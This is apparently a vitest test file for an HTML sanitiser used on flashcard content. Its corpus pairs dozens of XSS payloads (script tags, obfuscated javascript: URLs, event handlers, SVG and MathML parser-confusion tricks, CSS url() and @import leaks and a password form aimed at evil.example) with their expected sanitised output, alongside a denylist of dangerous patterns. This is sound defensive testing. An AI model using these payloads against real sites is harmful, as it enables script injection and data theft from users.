import { describe, expect, it } from 'vitest';
import { sanitiseCardHtml } from './sanitise';

/**
 * A denylist backstop, applied to every XSS-corpus case *in addition to* that case's exact
 * expected output. Its job is to catch a novel bypass that a future config change lets through
 * in some shape nobody pinned an expectation for.
 *
 * It is deliberately the weaker of the two checks. A substring denylist can only see payloads
 * that are dangerous in the encoding it is reading — a double-encoded scheme such as
 * `&amp;#106;avascript:` is invisible to it. That is exactly why every corpus case also asserts
 * its exact output with `toBe`: an equality assertion has no blind spots.
 */
function expectInert(output: string): void {
	const lowered = output.toLowerCase();
	expect(lowered).not.toMatch(/<script/);
	expect(lowered).not.toMatch(/<style/);
	expect(lowered).not.toMatch(/<svg/);
	expect(lowered).not.toMatch(/<math/);
	expect(lowered).not.toMatch(/<iframe|<object|<embed|<form|<input|<link|<meta|<base/);
	// Event handler attributes. The lookbehind only excludes `on…` continuing a longer word
	// ("response="), so `<img/onerror=…` with no separator is still caught — the check must not
	// be narrower than the implementation it verifies.
	expect(lowered).not.toMatch(/(?<![a-z])on[a-z]+\s*=/);
	expect(lowered).not.toMatch(/javascript:/);
	expect(lowered).not.toMatch(/vbscript:/);
	expect(lowered).not.toMatch(/data:/);
	expect(lowered).not.toMatch(/@import/);
	expect(lowered).not.toMatch(/url\s*\(/);
	expect(lowered).not.toMatch(/expression\s*\(/);
	expect(lowered).not.toMatch(/srcdoc/);
}

/** `[payload, exact expected output]`. */
type CorpusCase = readonly [string, string];

describe('sanitiseCardHtml — XSS corpus', () => {
	const corpus: Record<string, CorpusCase[]> = {
		'script tags': [
			['<script>alert(1)</script>', ''],
			['<SCRIPT SRC=//evil.example/x.js></SCRIPT>', ''],
			['<scr<script>ipt>alert(1)</script>', 'ipt&gt;alert(1)'],
			['<script>/* <img src=x onerror=alert(1)> */</script>', ''],
			['<script type="text/template"><img src=x onerror=alert(1)></script>', '']
		],
		'javascript: URLs': [
			['<a href="javascript:alert(1)">click</a>', '<a>click</a>'],
			['<a href="JaVaScRiPt:alert(1)">click</a>', '<a>click</a>'],
			['<a href=" javascript:alert(1)">click</a>', '<a>click</a>'],
			['<a href="java\tscript:alert(1)">click</a>', '<a>click</a>'],
			['<a href="java&#115;cript:alert(1)">click</a>', '<a>click</a>'],
			['<a href="&#x6a;avascript:alert(1)">click</a>', '<a>click</a>'],
			// Double-encoded: one decode short of a scheme, so it is inert as emitted and the
			// href is legitimately preserved. See the round-trip test below for why it is pinned.
			[
				'<a href="&amp;#106;avascript:alert(1)">click</a>',
				'<a href="&amp;#106;avascript:alert(1)">click</a>'
			],
			['<img src="javascript:alert(1)">', '<img />'],
			['<video src="javascript:alert(1)"></video>', '<video></video>'],
			['<a href="vbscript:msgbox(1)">click</a>', '<a>click</a>']
		],
		'event handler attributes': [
			['<img src="x" onerror="alert(1)">', '<img src="x" />'],
			['<img src=x onerror=alert(1)>', '<img src="x" />'],
			['<IMG SRC=x ONERROR=alert(1)>', '<img src="x" />'],
			// No separator before the handler name.
			['<img/onerror=alert(1) src=x>', '<img src="x" />'],
			['<img src=x onerror\n=alert(1)>', '<img src="x" />'],
			['<body onload="alert(1)">', ''],
			['<div onmouseover="alert(1)">hover</div>', '<div>hover</div>'],
			['<audio src="x.mp3" onloadstart="alert(1)"></audio>', '<audio src="x.mp3"></audio>'],
			[
				'<video><source src="x.mp4" onerror="alert(1)"></video>',
				'<video><source src="x.mp4" /></video>'
			],
			['<p onfocus="alert(1)" tabindex="0">x</p>', '<p>x</p>'],
			['<details ontoggle="alert(1)" open>x</details>', 'x'],
			['<span onanimationstart="alert(1)">x</span>', '<span>x</span>']
		],
		'SVG and foreign content': [
			['<svg onload="alert(1)"></svg>', ''],
			['<svg><script>alert(1)</script></svg>', ''],
			['<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>', ''],
			['<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>', '<a>x</a>'],
			['<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>', '<img src="x" />'],
			['<math><maction actiontype="statusline#javascript:alert(1)">x</maction></math>', 'x'],
			['<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>', '<table></table>']
		],
		'style-based exfiltration': [
			['<style>@import url("//evil.example/x.css");</style>', ''],
			['<style>body{background:url("//evil.example/?c=leak")}</style>', ''],
			['<style>input[value^="a"]{background:url(//evil.example/a)}</style>', ''],
			['<div style="background-image:url(//evil.example/?c=leak)">x</div>', '<div>x</div>'],
			['<div style="background:url(javascript:alert(1))">x</div>', '<div>x</div>'],
			['<div style="width:expression(alert(1))">x</div>', '<div>x</div>'],
			['<div style="-moz-binding:url(//evil.example/x.xml#x)">x</div>', '<div>x</div>'],
			['<div style="behavior:url(#default#time2)">x</div>', '<div>x</div>'],
			[
				'<div style="color:red;background-image:url(//evil.example/p)">x</div>',
				'<div style="color:red">x</div>'
			],
			['<style>@font-face{src:url(//evil.example/f)}</style>', '']
		],
		'data: URIs': [
			['<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">', '<img />'],
			['<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>', '<a>x</a>'],
			['<a href="data:text/html,<script>alert(1)</script>">x</a>', '<a>x</a>'],
			['<video src="data:text/html,<script>alert(1)</script>"></video>', '<video></video>'],
			['<source src="data:text/html,<script>alert(1)</script>">', '<source />']
		],
		'framing, forms and metadata injection': [
			['<iframe src="javascript:alert(1)"></iframe>', ''],
			['<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>', ''],
			['<object data="//evil.example/x.swf"></object>', ''],
			['<embed src="//evil.example/x.swf">', ''],
			['<form action="//evil.example/steal"><input name="p" type="password"></form>', ''],
			['<base href="//evil.example/">', ''],
			['<meta http-equiv="refresh" content="0;url=//evil.example">', ''],
			['<link rel="stylesheet" href="//evil.example/x.css">', '']
		],
		'mutation and parser-confusion attempts': [
			['<noscript><p title="</noscript><img src=x onerror=alert(1)>">', ''],
			['<template><img src=x onerror=alert(1)></template>', ''],
			['<textarea><img src=x onerror=alert(1)></textarea>', ''],
			['<xmp><img src=x onerror=alert(1)></xmp>', ''],
			['<title><img src=x onerror=alert(1)></title>', ''],
			['<div><!--<img src=x onerror=alert(1)>--></div>', '<div></div>'],
			['<![CDATA[<img src=x onerror=alert(1)>]]>', ''],
			[
				'<p><a href="#">a</a><style><a title="</style><img src=x onerror=alert(1)>">',
				'<p><a href="#">a</a><img src="x" />"&gt;</p>'
			]
		]
	};

	for (const [group, cases] of Object.entries(corpus)) {
		describe(group, () => {
			for (const [input, expected] of cases) {
				it(`renders inert: ${input}`, () => {
					const output = sanitiseCardHtml(input);
					expect(output).toBe(expected);
					expectInert(output);
				});
			}
		});
	}

	it('drops the text content of script and style, not just the tags', () => {
		expect(sanitiseCardHtml('<script>alert(1)</script>')).toBe('');
		expect(sanitiseCardHtml('<style>body{color:red}</style>')).toBe('');
	});

	it('strips protocol-relative URLs', () => {
		expect(sanitiseCardHtml('<a href="//evil.example/x">x</a>')).toBe('<a>x</a>');
	});
});

/**
 * A payload encoded one level deeper than the sanitiser decodes is inert as emitted — the
 * browser decodes `&amp;#106;` to the literal text `&#106;`, which is not a scheme — but it is
 * only inert for as long as nothing downstream performs a second decode. `{{FrontSide}}` in the
 * template engine re-embeds already-rendered HTML into another template, which is precisely the
 * shape in which an extra decode step can appear. These assertions pin the two properties that
 * keep that safe: the encoding level never *drops* on a pass, and re-sanitising is a fixed point,
 * so running the sanitiser again after any re-embedding cannot manufacture a live scheme.
 */
describe('sanitiseCardHtml — double-encoded schemes', () => {
	const doubleEncoded = '<a href="&amp;#106;avascript:alert(1)">click</a>';

	it('does not decode a double-encoded scheme down to a live one', () => {
		const once = sanitiseCardHtml(doubleEncoded);
		expect(once).toBe('<a href="&amp;#106;avascript:alert(1)">click</a>');
		expect(once.toLowerCase()).not.toContain('javascript:');
	});

	it('is a fixed point: repeated sanitisation never lowers the encoding level', () => {
		const once = sanitiseCardHtml(doubleEncoded);
		const twice = sanitiseCardHtml(once);
		const thrice = sanitiseCardHtml(twice);
		expect(twice).toBe(once);
		expect(thrice).toBe(once);
	});

	it('strips the scheme once an outer decode has actually happened', () => {
		// What the payload becomes if something downstream decodes it a second time. Re-sanitising
		// that must drop the href rather than pass it through.
		expect(sanitiseCardHtml('<a href="&#106;avascript:alert(1)">click</a>')).toBe('<a>click</a>');
	});
});

describe('sanitiseCardHtml — legitimate card formatting survives', () => {
	it('keeps basic inline formatting', () => {
		const html = '<b>bold</b> <i>italic</i> <u>u</u> <sub>1</sub><sup>2</sup> <br /> <div>x</div>';
		expect(sanitiseCardHtml(html)).toBe(html);
	});

	it('keeps furigana ruby markup', () => {
		const html = '<ruby>漢字<rp>(</rp><rt>かんじ</rt><rp>)</rp></ruby>';
		expect(sanitiseCardHtml(html)).toBe(html);
	});

	it('keeps cloze span markup and its class', () => {
		const html = '<span class="cloze">[...]</span>';
		expect(sanitiseCardHtml(html)).toBe(html);
	});

	it('keeps relative media references', () => {
		expect(sanitiseCardHtml('<img src="paris.jpg" alt="Paris" width="200">')).toBe(
			'<img src="paris.jpg" alt="Paris" width="200" />'
		);
		expect(sanitiseCardHtml('<audio src="/media/word.mp3" controls autoplay></audio>')).toBe(
			'<audio src="/media/word.mp3" controls autoplay></audio>'
		);
	});

	it('keeps a video with a nested source element', () => {
		const html = '<video controls><source src="clip.mp4" type="video/mp4" /></video>';
		expect(sanitiseCardHtml(html)).toBe(html);
	});

	it('keeps https links', () => {
		const html = '<a href="https://example.org/x">ref</a>';
		expect(sanitiseCardHtml(html)).toBe(html);
	});

	it('keeps safe inline styles used for highlighting', () => {
		expect(sanitiseCardHtml('<span style="color:#ff0000">x</span>')).toBe(
			'<span style="color:#ff0000">x</span>'
		);
		expect(sanitiseCardHtml('<span style="color:rgb(255, 0, 0)">x</span>')).toBe(
			'<span style="color:rgb(255, 0, 0)">x</span>'
		);
		expect(
			sanitiseCardHtml('<span style="font-family:\'MS Mincho\';font-size:1.4em">x</span>')
		).toBe('<span style="font-family:\'MS Mincho\';font-size:1.4em">x</span>');
	});

	it('drops only the unsafe declarations from a mixed style attribute', () => {
		const out = sanitiseCardHtml('<span style="color:red;background-image:url(//evil/p)">x</span>');
		expect(out).toBe('<span style="color:red">x</span>');
	});

	it('keeps tables', () => {
		const html =
			'<table><thead><tr><th scope="col">a</th></tr></thead><tbody><tr><td colspan="2">b</td></tr></tbody></table>';
		expect(sanitiseCardHtml(html)).toBe(html);
	});

	it('escapes bare text rather than dropping it', () => {
		expect(sanitiseCardHtml('5 < 6 & 7 > 2')).toBe('5 &lt; 6 &amp; 7 &gt; 2');
	});

	it('is idempotent', () => {
		const once = sanitiseCardHtml('<div style="color:red"><b>x</b><script>alert(1)</script></div>');
		expect(sanitiseCardHtml(once)).toBe(once);
	});
});
